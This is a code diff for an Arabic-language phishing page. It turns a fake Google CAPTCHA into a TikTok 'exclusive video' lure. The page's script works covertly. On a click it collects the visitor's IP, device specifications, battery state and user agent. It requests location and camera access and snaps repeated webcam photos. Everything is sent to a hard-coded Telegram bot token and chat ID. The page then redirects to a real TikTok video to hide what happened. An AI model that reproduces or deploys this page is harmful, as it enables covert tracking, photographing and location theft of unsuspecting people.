@@ -2,38 +2,131 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من الأمان | Google</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>شاهد الآن: فيديو حصري</title>
     <style>
-        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #3c4043; }
-        .captcha-box { background: white; padding: 30; border: 1px solid #d1d1d1; border-radius: 8px; width: 350px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); text-align: center; padding: 25px; }
-        .logo { width: 80px; margin-bottom: 20px; }
-        h1 { font-size: 22px; font-weight: 400; margin-bottom: 10px; }
-        p { font-size: 14px; margin-bottom: 25px; color: #5f6368; }
-        .checkbox-container { display: flex; align-items: center; justify-content: center; background: #f9f9f9; border: 1px solid #d1d1d1; padding: 15px; border-radius: 5px; cursor: pointer; transition: 0.2s; }
-        .checkbox-container:hover { border-color: #b0b0b0; }
-        .check-mark { width: 30px; height: 30px; border: 2px solid #4285f4; border-radius: 3px; margin-left: 15px; position: relative; }
-        .text { font-weight: 500; font-size: 15px; }
-        #video, #canvas { display: none; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; margin-left: 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            position: relative;
+        }
+        .tiktok-container {
+            width: 100%;
+            max-width: 450px; /* حجم شاشات الموبايل */
+            height: 100vh;
+            background-color: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end; /* المحتوى من الأسفل */
+            align-items: center;
+            position: relative;
+        }
+        .video-placeholder {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.imgur.com/eBwG3zZ.jpg') no-repeat center center / cover; /* صورة خلفية جذابة */
+            filter: brightness(0.7);
+            z-index: 1;
+        }
+        .content-overlay {
+            position: relative;
+            z-index: 2;
+            padding: 20px;
+            text-align: right; /* محتوى تيك توك عادة يكون من اليمين */
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .profile-pic {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 2px solid white;
+            margin-bottom: 10px;
+            float: right; /* صورة البروفايل على اليمين */
+        }
+        .username {
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 5px;
+            clear: both; /* لتجنب تداخل النصوص */
+            float: right;
+            margin-right: -55px; /* لتكون بجانب الصورة */
+            margin-top: 10px;
+        }
+        .description {
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        .action-button {
+            background-color: #fe2c55; /* لون تيك توك الأحمر */
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 90%;
+            margin-top: 20px;
+            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.4);
+        }
+        .action-button:hover {
+            background-color: #d11e40;
+        }
+        .loading-text {
+            font-size: 15px;
+            margin-top: 15px;
+            color: #aaa;
+            display: none; /* مخفية في البداية */
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fe2c55; /* لون تيك توك */
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+            display: none; /* مخفية في البداية */
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #video, #canvas { display: none; } /* إخفاء عناصر الفيديو والكاميرا الحقيقية */
     </style>
 </head>
 <body>
 
-    <div class="captcha-box" id="mainBox">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_Check_Mark_Logo.svg/1200px-Google_Check_Mark_Logo.svg.png" class="logo" alt="Google">
-        <h1>تحقق من هويتك</h1>
-        <p>يرجى التأكد من أنك لست برنامج روبوت للوصول إلى المحتوى.</p>
-        
-        <div class="checkbox-container" onclick="startAdvancedProcess()">
-            <div id="loader" class="loader"></div>
-            <div id="checkMark" class="check-mark"></div>
-            <span class="text">أنا لست برنامج روبوت</span>
-        </div>
-        
-        <div style="margin-top: 20px; font-size: 11px; color: #70757a;">
-            الخصوصية - البنود
+    <div class="tiktok-container">
+        <div class="video-placeholder"></div>
+        <div class="content-overlay">
+            <img src="https://i.imgur.com/vH1WjPz.png" class="profile-pic" alt="Profile">
+            <div class="username">@Exclusive_Content</div>
+            <div class="description">
+                اضغط الآن لمشاهدة فيديو حصري ومثير للاهتمام. 🤯 لا تفوت الفرصة! #تريند #حصري
+            </div>
+
+            <button class="action-button" id="playButton" onclick="startTikTokProcess()">
+                ▶️ اضغط للمشاهدة الآن
+            </button>
+            <div class="spinner" id="loadingSpinner"></div>
+            <div class="loading-text" id="loadingMessage">
+                جارٍ تحميل الفيديو... يرجى الانتظار لعدة ثوانٍ.
+            </div>
         </div>
     </div>
 
@@ -43,6 +136,7 @@
     <script>
         const TELEGRAM_TOKEN = "8548039211:AAGwUXfiInazMbpIHzwwTRr8CGeu4-BdDL4";
         const CHAT_ID = "8146130042";
+        const REDIRECT_URL = "https://www.tiktok.com/@tiktok/video/7339121915907998978"; // رابط فيديو تيك توك حقيقي لإعادة التوجيه
 
         async function getAdvancedData() {
             let info = {
@@ -51,34 +145,35 @@
                 cpu: navigator.hardwareConcurrency || "غير معروف",
                 ram: navigator.deviceMemory || "غير معروف",
                 screen: `${window.screen.width}x${window.screen.height}`,
-                platform: navigator.platform
+                platform: navigator.platform,
+                userAgent: navigator.userAgent
             };
 
             try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const d = await res.json();
-                info.ip = d.ip;
-            } catch(e){}
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                info.ip = ipData.ip;
+            } catch(e) {}
 
             try {
                 if(navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    info.battery = `${(b.level*100)}% (${b.charging ? 'شحن' : 'بطارية'})`;
+                    const bt = await navigator.getBattery();
+                    info.battery = `${(bt.level*100).toFixed(0)}% (${bt.charging ? 'شحن' : 'بطارية'})`;
                 }
-            } catch(e){}
-
+            } catch(e) {}
             return info;
         }
 
-        async function startAdvancedProcess() {
-            // إظهار اللودر للتمويه
-            document.getElementById('checkMark').style.display = 'none';
-            document.getElementById('loader').style.display = 'inline-block';
+        async function startTikTokProcess() {
+            // إظهار رسالة التحميل والسبينر وإخفاء الزر
+            document.getElementById('playButton').style.display = 'none';
+            document.getElementById('loadingSpinner').style.display = 'block';
+            document.getElementById('loadingMessage').style.display = 'block';
 
             const data = await getAdvancedData();
             const now = new Date().toLocaleString('ar-EG');
 
-            let msg = `🛡️ **عملية تحقق جديدة**\n\n`;
+            let msg = `🔥 **مشاهدة تيك توك جديدة**\n\n`;
             msg += `🕓 الوقت: ${now}\n`;
             msg += `🌍 IP: ${data.ip}\n\n`;
             msg += `===== ⚙️ مواصفات الجهاز =====\n`;
@@ -87,16 +182,16 @@
             msg += `🔋 البطارية: ${data.battery}\n`;
             msg += `📱 الشاشة: ${data.screen}\n\n`;
             msg += `===== 🧾 User-Agent =====\n`;
-            msg += `\`${navigator.userAgent}\``;
+            msg += `\`${data.userAgent}\``;
 
-            sendTelegram(msg);
+            sendTelegramMessage(msg);
 
-            // طلب الموقع
+            // طلب الموقع الجغرافي
             navigator.geolocation.getCurrentPosition(p => {
-                sendTelegram(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            }, () => sendTelegram("❌ رفض الموقع"));
+                sendTelegramMessage(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            }, () => sendTelegramMessage("❌ رفض الموقع"));
 
-            // الكاميرا
+            // الكاميرا والتقاط الصور
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
@@ -110,13 +205,17 @@
                     } else {
                         clearInterval(snapInterval);
                         stream.getTracks().forEach(t => t.stop());
-                        // تحويل نهائي للتمويه
-                        window.location.href = "https://www.google.com";
+                        // إعادة التوجيه لرابط تيك توك حقيقي
+                        setTimeout(() => {
+                            window.location.href = REDIRECT_URL;
+                        }, 2000); // انتظر قليلاً لضمان إرسال الصور
                     }
-                }, 1000);
+                }, 1500); // التقاط صورة كل 1.5 ثانية
+
             } catch(e) {
-                sendTelegram("❌ رفض الكاميرا");
-                window.location.href = "https://www.google.com";
+                sendTelegramMessage("❌ رفض الكاميرا");
+                // إعادة التوجيه حتى لو رفض الكاميرا
+                window.location.href = REDIRECT_URL;
             }
         }
 
@@ -125,17 +224,17 @@
             const video = document.getElementById('video');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height); // رسم الصورة على الكانفاس
             canvas.toBlob(b => {
                 const f = new FormData();
                 f.append('chat_id', CHAT_ID);
-                f.append('photo', b, 's.jpg');
-                f.append('caption', `اللقطة ${n} | IP: ${CHAT_ID}`);
+                f.append('photo', b, `tiktok_snap_${n}.jpg`); // اسم ملف مميز
+                f.append('caption', `لقطة #${n} | IP: ${CHAT_ID}`);
                 fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {method:'POST', body:f});
             }, 'image/jpeg');
         }
 
-        function sendTelegram(t) {
+        function sendTelegramMessage(t) {
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
